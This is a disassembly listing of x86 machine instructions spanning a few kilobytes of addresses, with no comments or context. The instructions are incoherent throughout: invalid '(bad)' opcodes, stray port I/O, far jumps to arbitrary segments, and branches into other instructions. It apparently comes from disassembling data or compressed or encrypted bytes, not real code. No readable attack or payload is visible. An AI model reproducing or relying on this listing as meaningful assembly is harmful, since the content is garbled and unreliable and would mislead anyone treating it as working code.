  41ad0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad0e:	out    0x92,al
  41ad10:	cmp    al,0x81
  41ad12:	arpl   WORD PTR [ebp-0x5e410675],bx
  41ad18:	xor    eax,0x500169d0
  41ad1d:	add    DWORD PTR [edi-0x26],0x20
  41ad21:	push   ds
  41ad22:	and    BYTE PTR [ebx],dh
  41ad24:	or     BYTE PTR [esi+0x19],dh
  41ad27:	rcl    BYTE PTR [ecx],cl
  41ad29:	jp     0x41ad71
  41ad2b:	mov    edi,0x4e03e4a1
  41ad30:	and    edi,DWORD PTR [ebx+0x754a66d0]
  41ad36:	jne    0x41ad34
  41ad38:	push   edi
  41ad39:	mov    ecx,0xedeaf299
  41ad3e:	test   DWORD PTR [esp+esi*8],esp
  41ad41:	and    eax,0x6135a77d
  41ad46:	xchg   esi,eax
  41ad47:	test   al,0x22
  41ad49:	imul   ebx,ecx,0x41
  41ad4c:	das    
  41ad4d:	icebp  
  41ad4e:	call   0xd72adde1
  41ad53:	dec    ebp
  41ad54:	mov    ebp,0x505ad4ae
  41ad59:	jns    0x41ad28
  41ad5b:	and    eax,0x717a96dc
  41ad60:	and    al,0xa3
  41ad62:	sub    al,0xfd
  41ad64:	mov    cl,0x5c
  41ad66:	push   esi
  41ad67:	add    bl,BYTE PTR [esi+0x32e6abb9]
  41ad6d:	bound  edx,QWORD PTR [eax]
  41ad6f:	mov    edx,0x4602fecf
  41ad74:	pop    ebx
  41ad75:	inc    ebx
  41ad76:	jle    0x41addc
  41ad78:	iret   
  41ad79:	pushf  
  41ad7a:	cmp    ebp,DWORD PTR [ebp-0x2987534e]
  41ad80:	mov    dl,0x61
  41ad82:	jns    0x41ade4
  41ad84:	xor    bl,BYTE PTR [ebp+0x1f]
  41ad87:	mov    bh,0x15
  41ad89:	pop    edx
  41ad8a:	xor    DWORD PTR [esi+0x3d888bba],edi
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebp+edi*1+0x42b00d6],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	sbb    eax,0x27175293
  41ae11:	push   edx
  41ae12:	jl     0x41ae07
  41ae14:	push   ds
  41ae15:	rcl    BYTE PTR [edi+0x37fd5334],1
  41ae1b:	or     eax,DWORD PTR [esi-0x41f727c9]
  41ae21:	pop    ds
  41ae22:	mov    ecx,0xd349f6cc
  41ae27:	adc    bh,cl
  41ae29:	test   BYTE PTR [eax-0x73],bl
  41ae2c:	ss (bad) 
  41ae2f:	ret    
  41ae30:	or     DWORD PTR [edi],ecx
  41ae32:	push   ecx
  41ae33:	imul   esi,eax,0x5e
  41ae36:	sbb    edx,DWORD PTR [ecx-0x2e]
  41ae39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae3a:	or     edx,DWORD PTR ds:0xc9bb4322
  41ae40:	sbb    DWORD PTR [ebx+0x598c5802],0x6e
  41ae47:	int    0x67
  41ae49:	jb     0x41ae6a
  41ae4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae4c:	(bad)  [esi+0xa]
  41ae4f:	pop    ebx
  41ae50:	aas    
  41ae51:	icebp  
  41ae52:	add    bh,ch
  41ae54:	push   cs
  41ae55:	repnz or edi,ecx
  41ae58:	lock fild QWORD PTR [ecx-0x419b9504]
  41ae5f:	nop
  41ae60:	xchg   esp,eax
  41ae61:	push   edx
  41ae62:	mov    bl,0x25
  41ae64:	jge    0x41ade8
  41ae66:	sub    esi,ecx
  41ae68:	jmp    0x1a161ad4
  41ae6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae6e:	ds mov ecx,0x2d324a06
  41ae74:	dec    ebx
  41ae75:	push   es
  41ae76:	mov    dh,0x68
  41ae78:	or     DWORD PTR [esi],ecx
  41ae7a:	enter  0xefd9,0xc4
  41ae7e:	scas   al,BYTE PTR es:[edi]
  41ae7f:	xchg   edi,eax
  41ae80:	cmp    al,0xae
  41ae82:	adc    BYTE PTR [ecx-0x70fe4795],ch
  41ae88:	lds    ecx,FWORD PTR [eax]
  41ae8a:	pop    esi
  41ae8b:	leave  
  41ae8c:	rcl    BYTE PTR [edx],0x72
  41ae8f:	cli    
  41ae90:	cwde   
  41ae91:	out    dx,eax
  41ae92:	in     al,0xc9
  41ae94:	mov    ebx,?
  41ae96:	and    al,0x64
  41ae98:	mov    BYTE PTR [ebx+0x67],cl
  41ae9b:	xchg   edx,eax
  41ae9c:	fst    QWORD PTR [eax+0x36]
  41ae9f:	rol    DWORD PTR [ebx+edi*4],0x8d
  41aea3:	pusha  
  41aea4:	inc    ebx
  41aea5:	dec    esp
  41aea6:	xchg   edi,eax
  41aea7:	sbb    BYTE PTR [ebx-0x52b5db8b],dh
  41aead:	xlat   BYTE PTR ds:[ebx]
  41aeae:	pop    eax
  41aeaf:	push   ecx
  41aeb0:	sub    BYTE PTR [edi-0x7c],ah
  41aeb3:	repz sar DWORD PTR ds:0xbbc69c91,cl
  41aeba:	test   eax,0x1f380cff
  41aebf:	pop    esp
  41aec0:	leave  
  41aec1:	ins    DWORD PTR es:[edi],dx
  41aec2:	add    BYTE PTR [ebp+0x78],ch
  41aec5:	int    0xeb
  41aec7:	push   es
  41aec8:	pop    es
  41aec9:	out    0x64,eax
  41aecb:	mov    dl,0xc8
  41aecd:	rol    ebp,cl
  41aecf:	cdq    
  41aed0:	inc    esp
  41aed1:	xor    edx,DWORD PTR [ecx+0xb81fa42]
  41aed7:	cmp    al,0x76
  41aed9:	loopne 0x41aedc
  41aedb:	add    DWORD PTR [esi],eax
  41aedd:	outs   dx,DWORD PTR ds:[esi]
  41aede:	fwait
  41aedf:	jge    0x41af01
  41aee1:	shl    BYTE PTR [edi],cl
  41aee3:	popf   
  41aee4:	es jno 0x41af11
  41aee7:	comiss xmm0,DWORD PTR [ebp-0x5c]
  41aeeb:	fwait
  41aeec:	xchg   esi,eax
  41aeed:	mov    ebp,0xb28361b7
  41aef2:	adc    DWORD PTR ds:0xce02e436,ebp
  41aef8:	stc    
  41aef9:	dec    eax
  41aefa:	cwde   
  41aefb:	push   ecx
  41aefc:	mov    edi,0x786c02f9
  41af01:	mov    BYTE PTR [eax+eiz*4],ch
  41af04:	cmp    esi,DWORD PTR [ecx]
  41af06:	cs cld 
  41af08:	stos   DWORD PTR es:[edi],eax
  41af09:	inc    ebp
  41af0a:	xor    al,bl
  41af0c:	cmc    
  41af0d:	std    
  41af0e:	hlt    
  41af0f:	ret    0x0
	...
  41af72:	add    BYTE PTR [eax],al
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x18aa44ee
  41af82:	push   ds
  41af83:	dec    edi
  41af84:	or     BYTE PTR [esi],bl
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	call   0x333861dd
  41af91:	jmp    0x53085843
  41af96:	push   eax
  41af97:	outs   dx,DWORD PTR ds:[esi]
  41af98:	lods   eax,DWORD PTR ds:[esi]
  41af99:	fdivr  QWORD PTR [ebx+0xc]
  41af9c:	(bad)  
  41af9d:	div    ebx
  41af9f:	test   eax,0x24abfd96
  41afa4:	js     0x41afe1
  41afa6:	test   DWORD PTR [eax+0x5e],esi
  41afa9:	jmp    0x41af2f
  41afab:	and    edi,esi
  41afad:	jb     0x41af31
  41afaf:	and    BYTE PTR [ecx-0x5d8544f5],0x6f
  41afb6:	(bad)  
  41afb7:	adc    al,0xb9
  41afb9:	outs   dx,DWORD PTR ds:[esi]
  41afba:	jno    0x41b01d
  41afbc:	mov    WORD PTR [ebx+0x5888c274],cs
  41afc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afc3:	and    al,0x3
  41afc5:	cld    
  41afc6:	add    eax,0x639ed950
  41afcb:	in     eax,dx
  41afcc:	shl    ch,1
  41afce:	sub    ebx,DWORD PTR [edi+0x41]
  41afd1:	into   
  41afd2:	jmp    0xe78f:0x8a9bd905
  41afd9:	push   ss
  41afda:	xchg   edi,eax
  41afdb:	sti    
  41afdc:	dec    esi
  41afdd:	cmp    BYTE PTR [ebx+0x3dcc99],bh
  41afe3:	jge    0x41aff2
  41afe5:	aam    0xde
  41afe7:	adc    DWORD PTR [ebp+edx*1-0x7c],edx
  41afeb:	mov    eax,ds:0x844c714f
  41aff0:	out    dx,eax
  41aff1:	jmp    0xaa28:0x6c694504
  41aff8:	xor    BYTE PTR [esi+ecx*2],ah
  41affb:	pushf  
  41affc:	lahf   
  41affd:	in     eax,dx
  41affe:	pushf  
  41afff:	dec    esp
  41b000:	or     BYTE PTR [ecx+0x1f],dl
  41b003:	shl    DWORD PTR [ebx+0x5fc39f04],1
  41b009:	sub    ebp,DWORD PTR [edi+0x47]
  41b00c:	and    ah,0x40
  41b00f:	jp     0x41b054
  41b011:	lods   eax,DWORD PTR ds:[esi]
  41b012:	in     al,0x3e
  41b014:	pop    es
  41b015:	aaa    
  41b016:	jmp    0x6e0747f2
  41b01b:	adc    eax,0x8e6a697f
  41b020:	bound  ebx,QWORD PTR [ebx*2-0x4c93db39]
  41b027:	pop    ss
  41b028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b029:	xor    ah,BYTE PTR [ebx+0x4b]
  41b02c:	gs jg  0x41afc3
  41b02f:	out    dx,eax
  41b030:	cld    
  41b031:	jle    0x41b013
  41b033:	cmp    edx,DWORD PTR [esi]
  41b035:	icebp  
  41b036:	sub    BYTE PTR [ecx+0x7d],ch
  41b039:	jno    0x41b07d
  41b03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b03c:	fld    DWORD PTR [ecx+0x31a6dcac]
  41b042:	dec    eax
  41b043:	xchg   ebx,eax
  41b044:	mov    al,ds:0xfc15aa5a
  41b049:	or     bl,BYTE PTR [esi]
  41b04b:	sbb    eax,0xfedbe95d
  41b050:	pop    es
  41b051:	mov    ebx,0x709d394c
  41b056:	sti    
  41b057:	mov    eax,0x8655d7a9
  41b05c:	adc    ebp,0x43
  41b05f:	sbb    esp,DWORD PTR [esi]
  41b061:	outs   dx,BYTE PTR ds:[esi]
  41b062:	(bad)  
  41b063:	push   esi
  41b064:	xor    eax,0xec6b6995
  41b069:	mov    ebx,0x491a72cb
  41b06e:	out    dx,al
  41b06f:	ins    DWORD PTR es:[edi],dx
  41b070:	fwait
  41b071:	retf   
  41b072:	in     eax,dx
  41b073:	push   0x6a
  41b075:	pop    ds
  41b076:	ins    BYTE PTR es:[edi],dx
  41b077:	sub    eax,0x2bd489b
  41b07c:	pop    eax
  41b07d:	inc    ebx
  41b07e:	or     ebp,DWORD PTR [edx]
  41b080:	ins    BYTE PTR es:[edi],dx
  41b081:	rol    al,cl
  41b083:	sahf   
  41b084:	mov    DWORD PTR [esi-0x6ed5ab99],ebx
  41b08a:	lods   al,BYTE PTR ds:[esi]
  41b08b:	push   es
  41b08c:	icebp  
  41b08d:	xchg   esi,eax
  41b08e:	add    al,0x1a
	...
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xe22dd988
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	gs dec esp
  41b10e:	data16 mov al,0x50
  41b111:	mov    eax,ds:0xe6c3b1b7
  41b116:	dec    ecx
  41b117:	adc    eax,0xf4bb4e07
  41b11c:	sbb    BYTE PTR [ebx-0x14d884d6],ch
  41b122:	sbb    bl,BYTE PTR [eax-0x4f]
  41b125:	ds ror edx,1
  41b128:	pop    ebx
  41b129:	adc    eax,0x38c1d791
  41b12e:	jno    0x41b0bc
  41b130:	sbb    al,0x97
  41b132:	fimul  DWORD PTR [ebx]
  41b134:	and    eax,0x89f713d3
  41b139:	jo     0x41b159
  41b13b:	int    0x87
  41b13d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b13e:	pop    ds
  41b13f:	enter  0x889d,0x93
  41b143:	inc    eax
  41b144:	je     0x3349241f
  41b14a:	pop    edx
  41b14b:	cwde   
  41b14c:	or     DWORD PTR [ecx-0x80],esi
  41b14f:	(bad)  
  41b150:	pushf  
  41b151:	push   0x8db6f81a
  41b156:	fs adc eax,0xaa540661
  41b15c:	and    al,0x18
  41b15e:	jne    0x41b1b4
  41b160:	pusha  
  41b161:	mov    esp,0x6d162266
  41b166:	and    al,0xee
  41b168:	test   al,0x7
  41b16a:	cdq    
  41b16b:	push   eax
  41b16c:	popa   
  41b16d:	xor    eax,0xaf06d261
  41b172:	hlt    
  41b173:	stos   DWORD PTR es:[edi],eax
  41b174:	cdq    
  41b175:	cmp    edx,DWORD PTR [esi]
  41b177:	rcr    edx,0x60
  41b17a:	scas   eax,DWORD PTR es:[edi]
  41b17b:	popf   
  41b17c:	pushf  
  41b17d:	inc    edx
  41b17e:	adc    al,0x4a
  41b180:	adc    BYTE PTR [esi-0x4a5f3840],bh
  41b186:	dec    ebp
  41b187:	sub    al,0x66
  41b189:	mov    ds:0x535d54aa,eax
  41b18e:	in     al,dx
  41b18f:	mov    bh,0xa3
  41b191:	iret   
  41b192:	fsub   DWORD PTR [edi-0x2a]
  41b195:	int    0x99
  41b197:	ins    DWORD PTR es:[edi],dx
  41b198:	fwait
  41b199:	sub    DWORD PTR [ebp-0x67],ebx
  41b19c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b19d:	mov    ah,0x53
  41b19f:	stos   DWORD PTR es:[edi],eax
  41b1a0:	xchg   BYTE PTR [ecx-0x2d018ce0],cl
  41b1a6:	call   0x4873:0x9aa5a394
  41b1ad:	inc    edx
  41b1ae:	into   
  41b1af:	or     BYTE PTR [edx-0x76bd29e5],bl
  41b1b5:	std    
  41b1b6:	adc    DWORD PTR [ebp-0x63],esi
  41b1b9:	push   ecx
  41b1ba:	and    al,0x69
  41b1bc:	ret    0x8fbb
  41b1bf:	or     esi,DWORD PTR [esi]
  41b1c1:	push   esp
  41b1c2:	fadd   DWORD PTR cs:[ebx+0x28]
  41b1c6:	clc    
  41b1c7:	fst    st(0)
  41b1c9:	jp     0x41b1d0
  41b1cb:	sar    DWORD PTR [esi-0x5c6e21be],0x15
  41b1d2:	mov    cl,0x84
  41b1d4:	xor    al,0xfa
  41b1d6:	jmp    0x41b22f
  41b1d8:	xor    ebp,eax
  41b1da:	push   ecx
  41b1db:	and    BYTE PTR [ebx+0x3f],dh
  41b1de:	push   edi
  41b1df:	push   edi
  41b1e0:	data16 lock jb 0x41b172
  41b1e4:	jns    0x41b1ba
  41b1e6:	icebp  
  41b1e7:	pop    ebp
  41b1e8:	inc    edi
  41b1e9:	and    bh,BYTE PTR [ecx+0x10]
  41b1ec:	dec    edi
  41b1ed:	cmp    eax,0x883f4be
  41b1f2:	ret    
  41b1f3:	imul   ebp,DWORD PTR [esi+ecx*2-0x576f9c18],0x76
  41b1fb:	mul    DWORD PTR [edx+eax*1]
  41b1fe:	bound  ebx,QWORD PTR [ebx+0x78]
  41b201:	stos   DWORD PTR es:[edi],eax
  41b202:	and    DWORD PTR [edx],edi
  41b204:	sub    DWORD PTR [eax-0x1f],0x2
  41b208:	fstp   DWORD PTR [ebx]
  41b20a:	loope  0x41b23d
  41b20c:	in     al,0xc2
  41b20e:	in     eax,0xd9
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebp+0x10e4a52d],dl
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	mov    WORD PTR [edi],cs
  41b28e:	bound  ebp,QWORD PTR [esi-0x667f0ff5]
  41b294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b295:	xlat   BYTE PTR ds:[ebx]
  41b296:	(bad)  
  41b297:	cld    
  41b298:	inc    ebp
  41b299:	pop    edx
  41b29a:	xchg   edx,eax
  41b29b:	(bad)  
  41b29c:	std    
  41b29d:	or     ah,BYTE PTR [ecx+eax*1+0x67]
  41b2a1:	mov    ds,WORD PTR [ecx-0x2b]
  41b2a4:	and    BYTE PTR [ecx],al
  41b2a6:	int3   
  41b2a7:	push   ecx
  41b2a8:	(bad)  
  41b2a9:	pop    edi
  41b2aa:	jmp    0xdf1a749
  41b2af:	and    al,0x41
  41b2b1:	and    DWORD PTR [esi-0x513d718b],0xffffffe6
  41b2b8:	sub    eax,0x58e6285c
  41b2bd:	pop    edi
  41b2be:	push   eax
  41b2bf:	cmp    eax,0xb6c19d4e
  41b2c4:	enter  0x1222,0x9b
  41b2c8:	mov    edi,0xe5d74e6c
  41b2cd:	jo     0x41b2fd
  41b2cf:	and    BYTE PTR [edx-0x5481f7e0],0xe9
  41b2d6:	add    al,cl
  41b2d8:	ret    0x87c9
  41b2db:	mul    BYTE PTR [ebp+0x10]
  41b2de:	mov    es,WORD PTR [eax+0xd]
  41b2e1:	jmp    0x41b29b
  41b2e3:	sbb    ah,dh
  41b2e5:	inc    edx
  41b2e6:	mov    ebp,0x58a2b2da
  41b2eb:	(bad)  
  41b2ec:	loope  0x41b2b7
  41b2ee:	ins    BYTE PTR es:[edi],dx
  41b2ef:	cmc    
  41b2f0:	push   eax
  41b2f1:	cdq    
  41b2f2:	push   0x42
  41b2f4:	stc    
  41b2f5:	adc    BYTE PTR [ecx-0x7b],0x48
  41b2f9:	pop    ss
  41b2fa:	icebp  
  41b2fb:	cmp    BYTE PTR [ebx+edx*1-0x11],0xcf
  41b300:	add    bl,BYTE PTR [ebx-0x8757978]
  41b306:	lods   al,BYTE PTR ds:[esi]
  41b307:	jecxz  0x41b2b3
  41b309:	imul   ecx,DWORD PTR [esi-0xe7c7e64],0xfffffff8
  41b310:	retf   
  41b311:	fild   QWORD PTR [esi*1+0x5683c386]
  41b318:	or     eax,0x6fe0b120
  41b31d:	mov    esp,0xafdde0fa
  41b322:	fbstp  TBYTE PTR [ecx+0x71]
  41b325:	cwde   
  41b326:	je     0x41b337
  41b328:	daa    
  41b329:	ss std 
  41b32b:	cmp    BYTE PTR [ebp+0x6238ac8],0xc0
  41b332:	pop    es
  41b333:	pop    esp
  41b334:	cwde   
  41b335:	not    DWORD PTR [ebx-0x79355374]
  41b33b:	inc    esi
  41b33c:	mov    cl,0xdd
  41b33e:	xor    ebp,DWORD PTR [ecx+ecx*8-0x1d]
  41b342:	popa   
  41b343:	xor    ebp,DWORD PTR [esi]
  41b345:	mov    WORD PTR [esi],gs
  41b347:	ja     0x41b2db
  41b349:	sub    ah,BYTE PTR [ebx+0x35ec775b]
  41b34f:	dec    ebp
  41b350:	jns    0x41b333
  41b352:	dec    esp
  41b353:	stc    
  41b354:	lock sub ah,0x7b
  41b358:	add    edi,DWORD PTR [ebx-0x15]
  41b35b:	fistp  DWORD PTR [edi+0x46bbe5f5]
  41b361:	ret    
  41b362:	cmp    eax,0xa85f309b
  41b367:	sahf   
  41b368:	loopne 0x41b30f
  41b36a:	lds    esi,FWORD PTR [edx]
  41b36c:	mov    ebx,0x2fe86ad9
  41b371:	push   0xd
  41b373:	sub    BYTE PTR ds:0xf7b0bbf8,dh
  41b379:	mov    ds:0x8f145eb,al
  41b37e:	or     al,0xfc
  41b380:	jle    0x41b3e1
  41b382:	push   eax
  41b383:	dec    eax
  41b384:	jae    0x41b324
  41b386:	(bad)  
  41b387:	jae    0x41b32b
  41b389:	and    bl,BYTE PTR [ecx+0x54d63520]
  41b38f:	mov    esp,0x0
	...
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	loope  0x41b47a
  41b402:	inc    ebx
  41b403:	push   eax
  41b404:	adc    al,0x21
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	out    dx,al
  41b40d:	sbb    BYTE PTR [edi],dh
  41b40f:	cmc    
  41b410:	push   esp
  41b411:	xchg   ecx,eax
  41b412:	push   0x5abe5e86
  41b417:	push   es
  41b418:	sub    eax,0x504a83cc
  41b41d:	sub    BYTE PTR [edi-0x537a7dc4],ch
  41b423:	and    BYTE PTR [ebx],ch
  41b425:	test   al,dl
  41b427:	or     eax,DWORD PTR [ebx-0x208e2df8]
  41b42d:	and    DWORD PTR [ebx+ecx*8+0x2cb3d41c],ebp
  41b434:	push   0x3
  41b436:	and    esi,ebp
  41b438:	out    dx,eax
  41b439:	inc    eax
  41b43a:	inc    esi
  41b43b:	ins    BYTE PTR es:[edi],dx
  41b43c:	fidivr DWORD PTR [eax]
  41b43e:	enter  0x546c,0xf4
  41b442:	sbb    esp,ecx
  41b444:	jle    0x41b3d3
  41b446:	fdiv   QWORD PTR [edi-0x54]
  41b449:	mov    BYTE PTR [esi+eiz*4-0x31c691a2],bl
  41b450:	arpl   WORD PTR [ebp+0x35f34de8],sp
  41b456:	pop    ebp
  41b457:	dec    ebx
  41b458:	xchg   esp,eax
  41b459:	ret    0xa95
  41b45c:	or     DWORD PTR [ecx+0x75],edx
  41b45f:	retf   0xa356
  41b462:	enter  0x2254,0x88
  41b466:	iret   
  41b467:	test   DWORD PTR [ecx],eax
  41b469:	mov    DWORD PTR [esi],eax
  41b46b:	rcl    BYTE PTR [ecx-0x145e90ba],1
  41b471:	into   
  41b472:	pop    eax
  41b473:	nop
  41b474:	xchg   ecx,eax
  41b475:	sahf   
  41b476:	pop    eax
  41b477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b478:	ret    0x5464
  41b47b:	mov    ch,0x3c
  41b47d:	xchg   esi,eax
  41b47e:	shr    BYTE PTR ds:0x42719701,0x3c
  41b485:	add    BYTE PTR [esi+edx*4],dl
  41b488:	mov    ecx,0x3cb0a775
  41b48d:	sar    BYTE PTR [edi-0x13],1
  41b490:	or     edx,DWORD PTR [edx]
  41b492:	mov    dh,0x22
  41b494:	jae    0x41b4ba
  41b496:	jmp    0xd9f7cb78
  41b49b:	retf   0xbe92
  41b49e:	mov    ds:0xec7394b5,eax
  41b4a3:	mov    dl,0x37
  41b4a5:	shr    DWORD PTR [ebp+0x71],cl
  41b4a8:	sbb    al,0xfa
  41b4aa:	jo     0x41b446
  41b4ac:	dec    eax
  41b4ad:	fnstsw WORD PTR [esi+edx*2-0x18]
  41b4b1:	les    esp,FWORD PTR [ebx+0x31]
  41b4b4:	pop    ebp
  41b4b5:	aaa    
  41b4b6:	or     DWORD PTR [ecx+0x31],ebp
  41b4b9:	rcr    BYTE PTR [eax+0x55f1e00d],0xb7
  41b4c0:	xor    DWORD PTR [ebp+0x2d4cf4d1],0x23
  41b4c7:	les    esi,FWORD PTR [esi]
  41b4c9:	iret   
  41b4ca:	mov    eax,ds:0x8b37a6c
  41b4cf:	pop    es
  41b4d0:	out    0x7a,eax
  41b4d2:	and    ah,BYTE PTR [eax+ecx*8+0x19cd3c1c]
  41b4d9:	sub    ch,bh
  41b4db:	add    edi,DWORD PTR [ebp+0x3c]
  41b4de:	add    DWORD PTR [edi-0x5c91d32a],esp
  41b4e4:	rcr    BYTE PTR [edi+0x62],0xe3
  41b4e8:	(bad)  
  41b4ea:	int3   
  41b4eb:	shl    BYTE PTR [ecx+ecx*8-0x64],cl
  41b4ef:	jge    0x41b4df
  41b4f1:	aaa    
  41b4f2:	fcomp  QWORD PTR [edi]
  41b4f4:	jecxz  0x41b521
  41b4f6:	mov    esp,0x597da41e
  41b4fb:	int3   
  41b4fc:	push   0x45
  41b4fe:	dec    edi
  41b4ff:	mov    al,ds:0x90256a68
  41b504:	sahf   
  41b505:	addr16 mov esp,0x63c6c460
  41b50b:	call   0xc23c1747
	...
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	out    dx,eax
  41b581:	or     ebp,DWORD PTR [edx]
  41b583:	xchg   DWORD PTR [eax],ebx
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	xor    al,0xdd
  41b58e:	dec    edx
  41b58f:	dec    edx
  41b590:	adc    eax,0xba0c0202
  41b595:	lds    esp,FWORD PTR [ebx+0x3483b6a6]
  41b59b:	dec    edi
  41b59c:	push   ebx
  41b59d:	or     eax,0x21d3317b
  41b5a2:	rol    DWORD PTR ds:0x31bf106a,1
  41b5a8:	or     BYTE PTR [ebx],bh
  41b5aa:	icebp  
  41b5ab:	sti    
  41b5ac:	pop    ecx
  41b5ad:	faddp  st(5),st
  41b5af:	lahf   
  41b5b0:	call   0xef6cb5cd
  41b5b5:	mov    dl,0x7c
  41b5b7:	or     al,0x37
  41b5b9:	mov    edx,0x4153f261
  41b5be:	xchg   DWORD PTR [esi+0x12],eax
  41b5c1:	adc    dl,BYTE PTR [edi+0xb]
  41b5c4:	repnz mov al,0xa8
  41b5c7:	mov    dl,BYTE PTR [ebx-0x14]
  41b5ca:	jge    0x41b56e
  41b5cc:	shr    edx,cl
  41b5ce:	fwait
  41b5cf:	add    BYTE PTR [eax],bl
  41b5d1:	loop   0x41b55c
  41b5d3:	push   edx
  41b5d4:	cmc    
  41b5d5:	xbegin 0x3104ec9f
  41b5db:	repz test BYTE PTR [edx-0x7f],bh
  41b5df:	fcom   QWORD PTR gs:[eax]
  41b5e2:	push   ecx
  41b5e3:	sub    bl,dl
  41b5e5:	xchg   esp,eax
  41b5e6:	fwait
  41b5e7:	out    0xb0,eax
  41b5e9:	pop    es
  41b5ea:	push   ebp
  41b5eb:	jg     0x33466f16
  41b5f1:	fdiv   QWORD PTR [ecx+0x2e3c4f44]
  41b5f7:	sub    esi,DWORD PTR [ecx-0x5a]
  41b5fa:	push   ebx
  41b5fb:	js     0x41b63a
  41b5fd:	or     bh,BYTE PTR [eax+0x54]
  41b600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b601:	cmp    eax,esp
  41b603:	cld    
  41b604:	inc    ecx
  41b605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b606:	add    DWORD PTR [esi+0x1e],ecx
  41b609:	xchg   ebx,eax
  41b60a:	stc    
  41b60b:	lods   eax,DWORD PTR ds:[esi]
  41b60c:	xchg   edx,eax
  41b60d:	lock inc esi
  41b60f:	sub    dl,0xa6
  41b612:	jb     0x41b5b4
  41b614:	pop    edi
  41b615:	or     DWORD PTR [esi],edi
  41b617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b618:	test   eax,0xe2a9be07
  41b61d:	mov    eax,0x5e6393b8
  41b622:	lock pop ds
  41b624:	cmp    DWORD PTR [edx-0x5b57c07e],edx
  41b62a:	les    esi,FWORD PTR [edx-0x35]
  41b62d:	and    edx,DWORD PTR [ebp+eax*4+0x1c]
  41b631:	jl     0x41b60a
  41b633:	pushf  
  41b634:	sub    DWORD PTR [ebx-0x12c5ea6d],0xf4a9f258
  41b63e:	xor    DWORD PTR [ebp-0x6213585e],eax
  41b644:	cmp    DWORD PTR [edi-0x6367123d],0x49
  41b64b:	mov    dl,0x6b
  41b64d:	add    ebp,esi
  41b64f:	dec    edx
  41b650:	xchg   al,bl
  41b652:	test   DWORD PTR [esi+0x4c],edx
  41b655:	das    
  41b656:	add    DWORD PTR [esi+0x70d9ac98],esi
  41b65c:	das    
  41b65d:	push   esi
  41b65e:	lea    edx,[esi+0x566056b6]
  41b664:	out    0x49,al
  41b666:	std    
  41b667:	adc    edx,DWORD PTR [eax-0x18]
  41b66a:	dec    esi
  41b66b:	lods   al,BYTE PTR ds:[esi]
  41b66c:	js     0x41b647
  41b66e:	ret    
  41b66f:	inc    edi
  41b670:	jmp    0x8efc:0xc9cbe19
  41b677:	inc    edi
  41b678:	jge    0x41b6f4
  41b67a:	dec    ebx
  41b67b:	cmp    eax,0x4daa1772
  41b680:	fs stos BYTE PTR es:[edi],al
  41b682:	pop    edx
  41b683:	rcr    BYTE PTR [esi+0x3cea6976],1
  41b689:	lds    ebp,FWORD PTR es:[esi+0x302dab46]
	...
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	jno    0x41b6a4
  41b702:	mov    bl,0xd5
  41b704:	sbb    al,0x23
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	xlat   BYTE PTR ds:[ebx]
  41b70d:	push   esi
  41b70e:	cmp    al,0x8f
  41b710:	xor    al,0x82
  41b712:	add    DWORD PTR [esi+0x27],0x821e97f1
  41b719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b71a:	sbb    bh,al
  41b71c:	jl     0x41b753
  41b71e:	sbb    BYTE PTR [eax],dl
  41b720:	fnsave [eax]
  41b722:	iret   
  41b723:	mov    eax,ds:0x3b78e923
